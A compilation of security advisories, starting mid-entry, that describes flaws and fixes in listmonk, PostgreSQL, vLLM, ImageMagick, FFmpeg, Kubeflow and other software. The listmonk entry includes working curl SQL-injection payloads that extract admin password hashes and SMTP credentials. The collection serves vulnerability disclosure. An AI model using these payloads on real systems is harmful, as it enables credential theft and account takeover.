This goes beyond what holding the lock gives that user, because a held lock ends in `Timeout` when the caller's timeout runs out, and this does not. With the looping-page layout the acquiring thread spins at 100% of one CPU on a free lock, `Timeout` is not raised, Ctrl-C does not interrupt it, and only killing the process ends it. It is a denial of service of the lock user's process only: it reads nothing and corrupts nothing, and in the long-row case the lock is still granted afterwards.

## Workarounds

- Keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky.
- Do not give the lock a database another account may write. The lock creates its database `0600`, and leaving it that way keeps other accounts from supplying its content. A lock shared between accounts through a `0666` database stays reachable even in `/tmp`.
- If a stall or hang appears, the file at the lock path is the cause; replacing it with an empty file restores the lock.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/834

A file overwrite vulnerability exists in Epiphany when installing WebExtension packages from .xpi files.

In src/webextension/ephy-web-extension-manager.c, decompress_xpi_thread() used libarchive with archive_read_support_format_all() (and filters), so the installer did not require a real ZIP. A TAR file named *.xpi was extracted. TAR supports hard-link entry types; with Epiphany's archive_write_disk options (including ARCHIVE_EXTRACT_PERM), a crafted hard-link target can cause an attacker-chosen existing user-writable file to be truncated and overwritten with attacker-controlled content and mode bits, without a dedicated warning dialog, when the user installs or opens the crafted .xpi.

This is related to but separate from the ZIP-slip path traversal fixed as CVE-2026-77679 (#2922 / MR !2143).

Requirements: the victim must install or open a malicious WebExtension (.xpi).

Affected: Epiphany >= 47.0 (WebExtension XPI install path).
Fixed: https://gitlab.gnome.org/GNOME/epiphany/-/merge_requests/2248 (commit 0cc9ab55 — only enable ZIP format support).
Upstream: https://gitlab.gnome.org/GNOME/epiphany/-/work_items/2988
Reporter acknowledgment: Fernando Munoz

items.title: XS::libbrotli versions before 1.2.1.0 for Perl bundle a brotli library with an out-of-bounds write in the decoder
items.description:
XS::libbrotli versions before 1.2.1.0 for Perl bundle a brotli library with an out-of-bounds write in the decoder.

Affected versions compile a bundled brotli into static archives that dependent XS modules link against at build time, rather than using the system library. The bundled copy, 1.0.7 or 1.1.0 across the range, carries the decoder out-of-bounds write described in CVE-2026-111497. Version 1.2.1.0 updates it to brotli 1.2.1.

XS::libbrotli has no Perl interface, so the decoder is reached through any dependent module that decompresses untrusted data with it. An attacker supplying a crafted brotli stream can corrupt decoder state, disclose memory, crash the process, or potentially execute arbitrary code. Upgrading the system brotli does not remediate this.

items.title: listmonk: SQL Injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and SMTP credentials
items.description:
### Summary

A SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscribers`) and read arbitrary tables from the database — including `users` (bcrypt password hashes) and `settings` (SMTP credentials, API keys). Both error-based and time-based exfiltration techniques are confirmed to work. This creates a privilege escalation path: `subscribers:sql_query` → hash exfiltration → offline bcrypt crack (cost factor 6) → Super Admin account takeover.

---

### Details

The subscriber query feature accepts a user-controlled `query` parameter that is injected directly into a SQL template via `strings.ReplaceAll`. The regular query endpoint `GET /api/subscribers` correctly calls `validateQueryTables` to block access to sensitive tables before execution. The export endpoint `GET /api/subscribers/export` **omits this call entirely**, creating an asymmetric bypass of an intentional security control.

**`internal/core/subscribers.go` — protected path (regular query):**

```go
// QuerySubscribers — table validation present
stmt := strings.ReplaceAll(c.q.QuerySubscribersTpl, "%query%", cond)
if err := validateQueryTables(c.db, stmt, allowedSubQueryTables); err != nil {
    return nil, 0, echo.NewHTTPError(http.StatusBadRequest,
        fmt.Sprintf("Error preparing subscriber query: %v", err))
}
```

**`internal/core/subscribers.go` — vulnerable path (export):**

```go
// ExportSubscribers — NO table validation
stmt := strings.ReplaceAll(c.q.QuerySubscribersForExport, "%query%", cond)
tx, err := c.db.Preparex(stmt)  // executes directly without restriction
```

**`queries/subscribers.sql` — the `%query%` placeholder is injected into a WHERE clause:**

```sql
SELECT subscribers.id, subscribers.email, ...
FROM subscribers
LEFT JOIN subscriber_lists ON ...
WHERE (subscribers.status != 'blocklisted') AND %query%
ORDER BY subscribers.id ASC LIMIT ...
```

Because the export path does not run inside a `ReadOnly` transaction (unlike the dry-run used in `QuerySubscribers`), PostgreSQL CTEs with data-modifying statements (`WITH ... UPDATE ... RETURNING`) are also executable, enabling write operations beyond read-only exfiltration.

---

### PoC

**Prerequisites:** Authenticated session with `subscribers:sql_query` and `subscribers:get_all` permissions.

**Step 1 — Confirm the bypass (blocked on query, open on export):**

```bash
# Blocked on regular endpoint:
curl -s "http://TARGET:9000/api/subscribers?query=(SELECT+1+FROM+users+LIMIT+1)+IS+NOT+NULL" \
  -H "Cookie: session=SESSION_TOKEN"
# → HTTP 400: {"message":"Error preparing subscriber query: table 'users' is not allowed"}

# Bypassed on export endpoint:
curl -s "http://TARGET:9000/api/subscribers/export?query=(SELECT+1+FROM+users+LIMIT+1)+IS+NOT+NULL" \
  -H "Cookie: session=SESSION_TOKEN"
# → HTTP 200: returns subscriber rows with no error
```

**Step 2 — Error-based exfiltration of admin password hash:**

```bash
curl -s "http://TARGET:9000/api/subscribers/export?\
query=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+integer)+>+0" \
  -H "Cookie: session=SESSION_TOKEN"
```

Response:
```json
{
  "message": "Error fetching Subscribers: pq: invalid input syntax for type integer: \"$2a$06$vI8n66eJwWCQDms5d47up.TmBYUsxRF13sw8efTh8TCyMQVLX2cn.\""
}
```

**Step 3 — Error-based exfiltration of SMTP credentials:**

```bash
curl -s "http://TARGET:9000/api/subscribers/export?\
query=CAST((SELECT+value::text+FROM+settings+WHERE+key='smtp'+LIMIT+1)+AS+integer)+>+0" \
  -H "Cookie: session=SESSION_TOKEN"
```

Response:
```json
{
  "message": "Error fetching Subscribers: pq: invalid input syntax for type integer: \"[{\"host\": \"smtp.yoursite.com\", \"port\": 25, \"enabled\": true, \"password\": \"...\", \"username\": \"...\"}]\""
}
```

**Step 4 — Time-based blind confirmation:**

```bash
time curl -s "http://TARGET:9000/api/subscribers/export?query=pg_sleep(3)+IS+NOT+NULL" \
  -H "Cookie: session=SESSION_TOKEN"
# Returns after ~3 seconds — confirms arbitrary SQL function execution
```

---

### Impact

This is a SQL injection vulnerability that bypasses an intentional security control. Any user with the `subscribers:sql_query` permission can:

- Read bcrypt password hashes of all admin accounts (including Super Admin)
- Extract SMTP credentials, API keys, and all values stored in the `settings` table
- Chain with offline bcrypt cracking (cost factor 6, fast to crack) for full account takeover
- Execute data-modifying SQL via PostgreSQL CTEs (write impact)

**Attack chain:** `subscribers:sql_query` → SQLi on export → bcrypt hash exfiltration → offline crack → Super Admin takeover → full instance compromise.

This finding is **distinct** from the accepted risk in listmonk's security policy ("SQL injection via subscriber query is a known limitation"). The regular query endpoint correctly applies `validateQueryTables` to prevent access to sensitive tables. The export endpoint is missing that same guard — this is an implementation gap in a deliberate security control, not an accepted design limitation.

items.title: libXfont2 FreeType backend uninitialised strike_index out-of-bounds read
items.description: Use of uninitialized memory when processing certain font files in X.Org libXfont before 2.0.10 could be used by authenticated attackers to crash the X server.

code16 Sharp is a Laravel-based framework for building content-management and administrative interfaces. Prior to 9.23.0, an authenticated attacker can submit an arbitrary PHP class name through the embed_key parameter to multiple embed API endpoints. The application passes the selected class to the Laravel service container, which invokes the class's __construct() method and recursively instantiates constructor dependencies, potentially causing unauthorized integrity or availability effects. The attacker cannot supply constructor parameter values or invoke an arbitrary method. This issue is fixed in version 9.23.0.

In Progress® Kendo® UI for jQuery versions prior to 2026.4.1111, kendo.init() compiles data-* attribute values with new Function when an invalid JSON object is supplied. An attacker with low privileges who can control these attribute values can inject JavaScript that executes during declarative widget initialization when a user loads or interacts with an affected page. Successful exploitation can compromise the confidentiality and integrity of data accessible in the user's browser context. The issue was reported in version 2022.3.1109; the first affected release has not been established.

IBM CockroachDB PostgreSQL for IBM VPC 26.2.0 through 26.2.3, 25.4.0 through 25.4.12, and 25.2.0 through 25.2.20 is vulnerable to server-side request forgery (SSRF). This may allow an authenticated attacker to send unauthorized requests from the system, potentially leading to network enumeration or facilitating other attacks.

Missing authorization in PostgreSQL DROP OWNED allows a role to remove itself from restrictive row level security policies, thereby reading or modifying rows that the policy was intended to deny, via queries after the DROP OWNED.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Inconsistent transition-capture state in PostgreSQL MERGE allows a table data modifier to make an AFTER trigger process the wrong new row, via a partitioned table MERGE that performs an INSERT before an UPDATE.  Within major versions 15-18, minor versions before PostgreSQL 18.7, 17.12, 16.16, and 15.20 are affected.  Versions before PostgreSQL 15 are unaffected.

Improper protection in PostgreSQL INSERT ... ON CONFLICT on auto-updatable views allows an attacker having INSERT and UPDATE privileges on the view to read and modify every row in the view's base table, via iterated INSERT ... ON CONFLICT DO UPDATE.  This bypasses the view's WHERE condition, whether or not the view is a security_barrier view.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Kubeflow Pipelines enables users to build and deploy portable, scalable machine learning workflows. Prior to 2.18.0, the legacy V1/raw-Argo execution cache mutating webhook and cache-server storage path hash selected template fields without the Kubernetes namespace, use the key alone for lookups and duplicate checks, and trust the mutable pipelines.kubeflow.org/execution_cache_key annotation when publishing outputs. In multi-user deployments where tenant namespaces share the cache service, a tenant with workload-submission privileges can read another namespace's cached outputs or seed matching outputs that are substituted into a later step. Standard KFP V2 component pods bypass this cache, matching requires the selected template fields and staleness policy, and arbitrary code execution or service availability impact is not established. This issue is fixed in version 2.18.0.

items.title: Docker Sandboxes restores removed automatically assigned port publications
items.description: Docker Sandboxes can silently republish a sandbox service after an operator removes its automatically assigned host-port mapping. The daemon removes the active binding but retains the original publication request, allowing a later port change or sandbox restart to publish the service again on a new host port. An attacker able to reach the restored endpoint may regain access to the service. Both TCP and UDP mappings are affected. Exposure is limited to the original bind address, which defaults to loopback. The issue is fixed in version 0.53.0.

In Splunk SOAR versions below 8.8.0, a user with container edit permission could supply timestamps when creating containers and artifacts through the Representational State Transfer (REST) API. This could alter the timeline shown to analysts and cause configured data retention strategies to delete affected records earlier than intended.
The vulnerability is possible because the REST API accepts client-supplied values for timestamps that Splunk SOAR uses to order records and apply data retention.
The early deletion impact requires an applicable data retention strategy; the timeline impact does not.
For more information see Manage your PostgreSQL database with data retention strategies (https://help.splunk.com/en/splunk-soar/soar-on-premises/administer-soar-on-premises/6.4.0/manage-your-splunk-soar-on-premises-system-health-and-performance/manage-your-postgresql-database-with-data-retention-strategies) in the Splunk documentation.

WarehousePG (WHPG) 7.2.1 through 7.6.0 is affected by a missing authorization vulnerability (CWE-862) in the built-in function gp_log_backend_memory_contexts(). Any authenticated database role can run this function without a GRANT. It also gets around the superuser restriction that PostgreSQL places on the underlying pg_log_backend_memory_contexts() function. A low-privileged user can force the segment backends of any other session, superuser sessions included, to write their memory context details to the segment server logs, which the attacker cannot read. Those details can include query text from other users' cached plans, and the call can be repeated to generate large amounts of log output. WarehousePG 6.x is not affected.

RAGFlow before 0.27.0 contains a server-side request forgery vulnerability that allows authenticated attackers to force the server to issue requests to arbitrary internal or external endpoints by supplying an unvalidated base_url to the POST /v1/llm/set_api_key endpoint handled by set_api_key() in api/apps/llm_app.py. Attackers can exploit this flaw to probe shared-network services such as MySQL, Elasticsearch, Redis, MinIO, the Infinity vector database, and cloud metadata endpoints, with raw upstream exception text returned in the response leaking internal service details, open ports, and configuration fingerprints.

items.title: Cross-user token data leakage in async scheduling + Pipeline Parallelism
items.description:
### Summary
When the V1 model runner uses async scheduling with pipeline parallelism (`pipeline_parallel_size > 1`), token data from a previous user's request context can leak into another user's response.

A detailed technical analysis has been reported in https://github.com/vllm-project/vllm/issues/38903#issue-4199660402.

**Affected versions:** v0.16.0 through v0.20.2 when using the V1 model runner with async scheduling and pipeline parallelism.

**Patched version:** v0.21.0.

### Details
**Root cause:** On non-last pipeline ranks during async scheduling, `token_ids_cpu` is never written with generated tokens, and `num_tokens_no_spec` is incorrectly reset each step. When the `token_ids_cpu` fallback path is triggered (e.g., mixed prefill/decode batches), stale token data from a previous request occupying the same batch slot is read as model input and written into the KV cache, permanently contaminating the response.

### Impact
This constitutes a cross-user data leak in multi-tenant inference deployments. In environments where users submit sensitive or private prompts (e.g., personal information, proprietary business data, medical or legal content), fragments of one user's context can influence or appear in another user's output.

### Workaround
For deployments on affected versions, either of these settings mitigates the issue.

- Launching vLLM with `--no-async-scheduling`
- Setting `pipeline_parallel_size=1` (disabling pipeline parallelism)

A fix for this was introduced in https://github.com/vllm-project/vllm/pull/41133.

items.title: Kubeshark: MCP `download_file` writes fetched bytes to an unvalidated destination path
items.description: Kubeshark is an eBPF-powered network observability tool for Kubernetes. From 53.1.0 until 53.4.0, the download_file tool in cmd/mcpRunner.go accepts caller-controlled path and dest values, fetches a selected Kubeshark Hub API response, and writes the returned bytes through os.Create(dest) in callDownloadFile without confining the destination. An attacker who influences arguments through an AI agent driving kubeshark mcp can write Hub-supplied bytes to any path writable by the local MCP user and can read captured network traffic from default auth-disabled Hub deployments. The tool is registered without --allow-destructive; reliable code execution is not demonstrated because the bytes are constrained to Hub API responses. Hub-side default authentication remains outside this remediation, so captured traffic can remain readable in default auth-disabled Hub deployments after the local destination-write fix. The destination-write issue is fixed in version 53.4.0.

one-hub through 0.14.27 contains a server-side request forgery vulnerability in GetImageFromUrl in common/image/image.go that fetches vision chat image_url values without destination restrictions. Attackers holding a standard non-admin API token can send crafted /v1/chat/completions requests via Claude, OpenRouter or Ollama providers to reach internal services or cloud metadata endpoints.

items.title: OpenAirInterface CN5G AMF before 2.2.2 Stale PDU Session Contexts via SMF Selection Failure
items.description: OpenAirInterface CN5G AMF before 2.2.2 contains a missing resource release vulnerability in amf_sbi::handle_itti_message() that leaves stale PDU session contexts when NRF lookup or SMF selection fails. Authenticated UEs can request PDU sessions while no SMF is selectable, causing deregistration to wait on SMF release timeouts and stall shared NAS processing for other UEs.

A security issue was discovered in ingress-nginx where a user with permission to create an Ingress may be able to cause denial of service of the ingress-nginx data plane, or possibly redirect traffic from other Ingresses. Kubernetes clusters are only affected if they are using ingress-nginx.

Due to a missing check, the mirror-target Ingress annotation can be used to target an unauthenticated configuration API within the ingress-nginx controller, allowing write commands to be submitted. Corrupting the data within that configuration API results in all traffic through ingress-nginx being dropped until an Ingress configuration change or a controller restart causes the data to be recreated correctly.

In principle, this write access could also be used to redirect traffic from other Ingresses controlled by the same ingress-nginx instance. In practice, there is negligible additional risk: such redirection would require privileged information about internal ingress-nginx state, and users can already redirect traffic from other Ingresses controlled by the same ingress-nginx anyway.

NVIDIA OpenShell for Linux contains a vulnerability in Kubernetes network policy enforcement where a local attacker with low privileges could cause the proxy to attribute network traffic to a different process due to TCP source-port identity confusion, allowing the attacker to bypass process-based network policy restrictions. A successful exploit of this vulnerability might lead to information disclosure and data tampering.

vLLM from 0.20.1 before 0.29.0 contains an improper input validation vulnerability that allows remote attackers to crash the engine by supplying out-of-vocabulary stop_token_ids. Attackers can send OpenAI chat, completion, generate, or batch requests with invalid IDs to terminate the engine or write outside the V2 runner's logits buffer.

vLLM from 0.19.0 before 0.24.0 contains a decompression bomb vulnerability because the AudioMediaIO multimodal path calls load_audio without the max_duration_s decoded-duration limit. Authenticated attackers can send small compressed audio via input_audio or audio_url in /v1/chat/completions requests that expands to huge decoded PCM, exhausting server memory.

vLLM before 0.31.0 contains a cache aliasing vulnerability that allows authenticated attackers to collide shared cache keys by supplying caller-controlled values such as EXIF ImageID or cache_salt. Attackers can set a UUID EXIF ImageID to receive another request's cached processed media, or match cache_salt to a LoRA name to reuse first-block KV state.

items.title: Qbian61 forum-java commit 20f7e68 through 63152c4 Stored XSS via Comment Reply Dialog
items.description: Qbian61 forum-java commit 20f7e68 through commit 63152c4 contains a stored cross-site scripting vulnerability that allows authenticated users to inject script by posting unsanitized comment content rendered via jQuery .html() in the reply dialog. Attackers can post comments with img onerror payloads that execute when victims click Reply, stealing the non-HttpOnly sid session cookie to hijack accounts including administrators.

phpMyFAQ before 4.1.12 and 4.2.0-alpha.2 before 4.2.0-RC.2 contains an authorization bypass vulnerability that allows authenticated editors to manipulate search index documents by supplying an arbitrary solutionId to the /admin/api/faq/update endpoint. On Elasticsearch or OpenSearch deployments, category-restricted editors can remove published FAQs from search, overwrite other FAQs' search documents, or plant entries that remain searchable after unpublishing.

Incorrect authorization in the credential loading logic in AWS Private CA Connector for Kubernetes (aws-privateca-issuer) before 1.12.0 might allow an authenticated remote user with permission to create namespace-scoped issuers to obtain certificates, including subordinate CA certificates, signed by another namespace's AWS Private CA with that namespace's stored AWS credentials, via a namespace-scoped issuer that references a credentials Secret in that namespace.



To remediate this issue, users should first copy any credentials Secret they intend a namespace-scoped issuer to use into that issuer's namespace and update the issuer's secretRef.namespace to match. Then, upgrade aws-privateca-issuer to version 1.12.0 or the AWS Private CA Connector for Kubernetes EKS add-on to version v1.12.0-eksbuild.1.

Incorrect authorization in the credential handling for namespace-scoped issuers in AWS Private CA Connector for Kubernetes (aws-privateca-issuer) before 1.12.0 might allow an authenticated remote user with permission to create namespace-scoped issuers to obtain certificates, including subordinate CA certificates, from every AWS Private CA and certificate template reachable by the controller's own AWS identity or by any IAM role that identity can assume. This happens because a namespace-scoped issuer that supplies no credentials, or sets only a role, falls back to the controller's own identity.



To remediate this issue, users should first update any namespace-scoped issuers that rely on the controller's identity to use their own credentials. Then, upgrade aws-privateca-issuer to version 1.12.0 or the AWS Private CA Connector for Kubernetes EKS add-on to version v1.12.0-eksbuild.1.

SecureDrop is an open-source whistleblower submission system that media organizations can use to securely accept documents from, and communicate with anonymous sources. From 2.5.0 until 2.16.0, the `Journalist Interface` can accept an `API session` token against the `web UI` because its `SessionInterface` keeps a mutable session key prefix that changes with each request and persists across requests. API and web sessions were separated in `Redis` starting in version 2.5.0, but prefix corruption confuses those session namespaces. An attacker who already has access to the secret `Journalist Interface` onion address, the required authentication access and a recent nonexpired `API session` token can reuse that token against the `web UI` until its natural expiry, at most eight hours. The corrupted prefix can also prevent logout from deleting the correct `Redis` session, although normal expiry still applies. A compromised journalist can access encrypted submissions and perform broad actions on source submissions, but this issue does not expose plaintext submissions or affect the running system's availability. This issue is fixed in version 2.16.0.

ImageMagick before 7.1.2-33 contains a heap buffer overflow vulnerability on 32-bit systems that allows attackers to overwrite heap memory when convex-hull information is requested. Attackers can supply crafted images processed with convex-hull calculations to corrupt heap memory, causing crashes or potential code execution.

ImageMagick before 7.1.2-33 contains a memory leak vulnerability in the magick compare command caused by missing cleanup when an operation fails. Attackers can supply inputs that trigger repeated failed compare operations to exhaust memory and cause denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 does not properly account for symbolic links in the IsRightsAuthorizedByName security policy check, allowing configured policy restrictions to be bypassed. Local attackers who can create a symlink can point it at a policy-restricted path to evade the configured policy.

ImageMagick 7.1.0-20 before 7.1.2-32 contains an invalid memory free vulnerability in the fx operation that occurs when initialization of an FX runtime entry fails. Attackers can trigger the failed FX runtime initialization to cause an invalid free, resulting in memory corruption and application crashes.

ImageMagick before 7.1.2-32 contains a time-of-check time-of-use symlink race vulnerability that allows attackers to bypass the path security policy when executing a magick script. Attackers can swap a checked path with a symlink during script execution to read files that the security policy is meant to block.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 lacks proper synchronization when the security policy is accessed, so simultaneous reads and writes of the policy by multiple threads trigger a race condition that causes a heap buffer over-write. An attacker able to induce concurrent security policy access can crash the application, causing a denial of service.

ImageMagick 7.1.0-20 before 7.1.2-32 contains a use after free vulnerability in the -fx option that occurs when a memory allocation fails during a specific operation. Attackers who can supply crafted -fx expressions under memory pressure can trigger freed memory access, causing crashes or memory corruption.

ImageMagick before 6.9.13-57 and 7.x before 7.1.2-32 contains a type confusion flaw in the INFO, JSON and YAML encoders, where an internal method receives a pointer of an unexpected type when writing an image in a compressed format. An attacker who can cause such an image write can trigger a SIGABRT or SIGSEGV, crashing the process and causing denial of service.

items.title: FFmpeg through 9.0.2 ProRes prores_aw Heap Out-of-Bounds Read in Interlaced Encoding
items.description: FFmpeg through 9.0.2 contains a heap out-of-bounds read vulnerability in libavcodec/proresenc_anatoliy.c that occurs when the prores_aw encoder processes interlaced, odd-height frames. Attackers can supply odd-height video that causes subimage_with_fill_template() to fill padding rows from memory before the fill_y buffer, leaking heap contents into the encoded output.

items.title: FFmpeg through 9.0.2 Uninitialized Memory Disclosure via ADPCM_MS Trellis Encoding
items.description: FFmpeg through 9.0.2 contains an uninitialized memory disclosure vulnerability in adpcm_encode_frame() in libavcodec/adpcmenc.c that leaks heap bytes when encoding mono ADPCM_MS audio with trellis enabled. Attackers submitting audio to a service using this encoding receive output packets where about half of each block contains stale heap memory from the encoding process.

items.title: FFmpeg through 9.0.2 Memory Leak via MediaCodec JNI setBuffer
items.description: FFmpeg through 9.0.2 contains a memory leak vulnerability in mediaformat_jni_setBuffer() in libavcodec/mediacodec_wrapper.c that never frees buffers wrapped with NewDirectByteBuffer(). Attackers can supply crafted media files with large extradata, leaking native memory on each MediaCodec decoder configuration in Android applications and causing resource exhaustion.

items.title: FFmpeg through 9.0.2 Out-of-Bounds Read via prores_ks Interlaced Alpha Encoding
items.description: FFmpeg through 9.0.2 contains an out-of-bounds read vulnerability in the prores_ks encoder's get_alpha_data() that reads before the blocks buffer for interlaced frames with odd heights. Attackers can supply video with alpha and odd height encoded to interlaced ProRes 4444, causing out-of-bounds memory to be encoded into the output alpha plane.

items.title: Kubeflow Pipelines — API server fetches a caller-supplied pipelineURL without host validation
items.description:
## Summary

The Kubeflow Pipelines API server fetched caller-supplied pipeline package URLs without restricting the destination. A caller authorized to create a pipeline or pipeline version could cause requests to originate from the API server's network position, including to internal services that the caller could not otherwise reach.

## Impact

The reported evidence demonstrates blind server-side request forgery and a limited status-code oracle. The fetched response is processed as a pipeline package; the report does not demonstrate arbitrary response-body disclosure or credential theft. A request to a cloud metadata endpoint returned HTTP 403, which does not establish access to metadata contents or tokens.

The confidentiality metric is Low to reflect the limited information obtainable through the status-code oracle. High confidentiality impact and integrity or availability impact are not established by the submitted evidence. Impact depends on the API server's network reachability and the deployment's trust boundaries.

## Patches

Fixed by [kubeflow/pipelines#12750](https://github.com/kubeflow/pipelines/pull/12750), first released in 2.17.0. The fix validates URL schemes, ports, allowed domains, and resolved IP addresses; validates redirects; and enforces IP restrictions at connection time. The HTTP client also applies timeouts and disables environment proxy use so connections pass through the validated dialer.

Operators should keep pipeline URL validation enabled and limit additional allowed domains to trusted pipeline sources.

## Workarounds

Until upgrading, restrict API-server egress to required destinations through deployment-specific network controls. Account for required Kubernetes and storage connectivity when applying these restrictions.

## Related reports

This is the canonical advisory for the API-server pipeline URL SSRF family. [GHSA-wg4h-pp3x-hxhv](https://github.com/kubeflow/pipelines/security/advisories/GHSA-wg4h-pp3x-hxhv) is tracked as a duplicate submission. Each submission retains its own reporter attribution; this cross-link does not transfer authorship.

## Earlier related submission

@pwny0's [GHSA-fxx8-rx8w-p9v7](https://github.com/kubeflow/pipelines/security/advisories/GHSA-fxx8-rx8w-p9v7), submitted September 23, 2023, included an earlier report of external interaction through the API-server pipeline-package URL path. That portion is consolidated here; its namespace-based frontend SSRF is tracked separately under [GHSA-895m-3hxm-h4mg](https://github.com/kubeflow/pipelines/security/advisories/GHSA-895m-3hxm-h4mg) / CVE-2023-6570.

This acknowledges the earlier pipeline-URL submission without attributing fxx8's frontend response-disclosure or cookie-forwarding evidence to the API-server path. @pwny0 retains reporter credit on fxx8; @gasbugs retains reporter credit for this submission. Neither report's authorship is transferred.

ImageMagick before 7.1.2-35 contains a heap buffer overflow vulnerability that allows attackers to write beyond allocated heap memory by supplying crafted images. Attackers can provide a crafted set of images processed by the magick stream operation to corrupt heap memory and crash the application.

ImageMagick before 7.1.2-35 contains a double free vulnerability that allows attackers to trigger an invalid memory free by using the DPC compare metric. Attackers can supply images for comparison with the DPC metric to corrupt memory and crash the application, causing denial of service.

items.title: FFmpeg 8.0 before 9.1 Uninitialized Memory Use via Opus RTP Depacketizer
items.description: FFmpeg 8.0 before 9.1 contains a use of uninitialized memory vulnerability in opus_parse_packet() in libavformat/rtpdec_opus.c that reads the Opus TOC byte from stale buffer memory when parsing empty RTP payloads. A malicious RTSP server or RTP sender can deliver an empty Opus payload to cause incorrect packet durations and leak bits of stale memory through pkt->duration.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: DDL).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

GitLab has remediated an issue in GitLab CE/EE affecting all versions from 19.2 before 19.3.9, 19.4 before 19.4.8, and 19.5 before 19.5.6 that under certain conditions could have allowed an authenticated user holding a granular personal access token with limited scope to authorize Kubernetes API proxy access beyond the token's intended boundaries due to missing granular scope enforcement in the Kubernetes agent proxy-user authorization flow.

PeerBanHelper automatically blocks unwanted, leeching, and abnormal BitTorrent peers using customizable and cloud rules. From 5.0.0 until 9.3.15, the /api/statistic/analysis/field endpoint accepts a crafted field query parameter from an authenticated user and passes it to countField or sumField. The mapField() method forwards unrecognized field names without sanitization, so unrecognized field names are interpolated into SQL through ${field} across the SQLite, MySQL, and PostgreSQL mappers. Successful exploitation can read all data in the PeerBanHelper database. This issue is fixed in version 9.3.15.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

When an operator enables store.analysis_statistics_dir, a network client with PRODUCT_STORE permission for a product can call that product's storeAnalysisStatistics Thrift-over-HTTP method. CodeChecker 6.29.0 decodes the attacker-controlled Base64 string and passes the complete compressed input to one-shot zlib.decompress(). No maximum decompressed size is enforced.



This gives a correctly authorized, non-superuser store account a high-ratio memory and persistent-disk amplification primitive. The complete output is first materialized as a Python bytes object and is then written to the configured statistics directory. A sufficiently scaled payload can exhaust the API worker or host memory and impair CodeChecker availability.



The shipped value of store.analysis_statistics_dir is null, so the affected feature is disabled by default. The primary assessment does not rely on authentication being disabled. There is no authorization bypass and no path traversal in this report.

An issue in Kibana allows Elasticsearch transforms in directly uploaded integration packages to run with Kibana's internal system identity instead of the installing user's privileges. A user with Integrations: All and Agent policies: All privileges in a single Kibana space could access or modify data they are not authorized to access, including agent policies from other spaces. This could disclose sensitive information or lead to command execution on managed Elastic Agent hosts.

Uncontrolled resource allocation in Elasticsearch mapping updates can lead to denial of service. An authenticated user with index-management privileges can submit specially crafted mapping updates that are expanded into multiple large in-memory representations. The amplification during request parsing and mapping updates can exhaust heap memory and crash an Elasticsearch node.

Laravel is a web application framework. Prior to 12.71.0 and 13.40.0, Laravel's Concurrency::run process driver can treat a forged internal result message in child standard output as framework output. An application route must invoke Concurrency::run, and a task must write attacker-controlled bytes at the start of the child's standard output that form a complete JSON document followed by gzip magic bytes. Under those application-specific conditions, an attacker can forge the internal result message and achieve remote code execution. The affected behavior is not exposed by default and requires application code that routes untrusted input into task output. This issue is fixed in versions 12.71.0 and 13.40.0.

An authorization bypass vulnerability in the GlobalProtect gateway of Palo Alto Networks PAN-OS® software enables an authenticated attacker with valid GlobalProtect credentials to bypass IP address restrictions and circumvent network access controls that rely on source IP filtering.

Cloud NGFW is not affected by this vulnerability.

djust provides Phoenix LiveView-style reactive server-side rendering for Django with Rust-powered performance. Prior to versions 1.0.10 and 1.1.2, djust keys context output-safety grants by variable name and fails to revoke a grant when a template bind replaces the value associated with that name. A template using {% with %}, {% for %}, {% include ... with %}, tuple unpacking, or assign tags can therefore rebind a name that previously held mark_safe content and emit the new attacker-controlled value without escaping, including descendant lookups through the rebound name. This can cause stored or reflected cross-site scripting when a victim renders the affected template. This issue is fixed in versions 1.0.10 and 1.1.2.

